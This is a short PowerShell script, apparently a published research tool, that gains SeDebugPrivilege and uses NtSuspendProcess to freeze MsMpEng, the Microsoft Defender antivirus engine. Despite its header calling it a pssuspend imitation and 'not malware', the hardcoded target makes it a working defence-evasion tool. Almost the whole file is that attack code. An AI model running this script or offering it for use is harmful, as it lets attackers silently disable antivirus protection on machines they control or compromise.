# Author: 0xv1n
# Purpose: This script was written to see if I could mimic the functionality of Sysinternals pssuspend strictly with PowerShell
# This script is intended for research purposes and I am not responsible for malicious use. Nothing in here is malware, just built-in Windows API usage.

Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class Advapi32 {
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const UInt32 TOKEN_QUERY = 0x0008;
        public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public UInt32 LowPart;
        public Int32 HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
        public UInt32 Attributes;
    }

    public struct TOKEN_PRIVILEGES {
        public UInt32 PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    public class NtDll {
        [DllImport("ntdll.dll")]
        public static extern int NtSuspendProcess(IntPtr processHandle);

        [DllImport("ntdll.dll")]
        public static extern int NtResumeProcess(IntPtr processHandle);
    }

    public class Kernel32 {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
"@

function Enable-DebugPrivilege {
    $hToken = [IntPtr]::Zero
    $luid = New-Object LUID
    $tokenPrivileges = New-Object TOKEN_PRIVILEGES

    if (-not [Advapi32]::OpenProcessToken([System.Diagnostics.Process]::GetCurrentProcess().Handle, [Advapi32]::TOKEN_ADJUST_PRIVILEGES -bor [Advapi32]::TOKEN_QUERY, [ref] $hToken)) {
        throw "Failed to open process token. Error: $($LASTEXITCODE)"
    }

    if (-not [Advapi32]::LookupPrivilegeValue([NullString]::Value, "SeDebugPrivilege", [ref] $luid)) {
        throw "Failed to look up privilege value. Error: $($LASTEXITCODE)"
    }

    $tokenPrivileges.PrivilegeCount = 1
    $tokenPrivileges.Privileges.Luid = $luid
    $tokenPrivileges.Privileges.Attributes = [Advapi32]::SE_PRIVILEGE_ENABLED

    if (-not [Advapi32]::AdjustTokenPrivileges($hToken, $false, [ref] $tokenPrivileges, 0, [IntPtr]::Zero, [IntPtr]::Zero)) {
        throw "Failed to adjust token privileges. Error: $($LASTEXITCODE)"
    }
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $isAdmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    return $isAdmin
}

if (-not (Test-Admin)) {
    Write-Host "Please run the script with administrative privileges."
    return
}

Enable-DebugPrivilege

$processName = "MsMpEng"
$process = Get-Process -Name $processName -ErrorAction SilentlyContinue

if ($process -ne $null) {
    $PROCESS_SUSPEND_RESUME = 0x0800

    $processId = $process.Id
    $processHandle = [Kernel32]::OpenProcess($PROCESS_SUSPEND_RESUME, $false, $processId)

    if ($processHandle -ne [IntPtr]::Zero) {
        $suspendResult = [NtDll]::NtSuspendProcess($processHandle)

        # TODO: For some reason, I'm not entering these blocks even if the suspension is successful.
        if ($suspendResult -eq 0) {
            Write-Host "Process $($processName) suspended successfully."
        } else {
            Write-Host "Failed to suspend process $($processName). Error: $($suspendResult)"
        }

        [Kernel32]::CloseHandle($processHandle)
    } else {
        Write-Host "Failed to open process handle for $($processName)."
    }
} else {
    Write-Host "Process $($processName) not found."
}
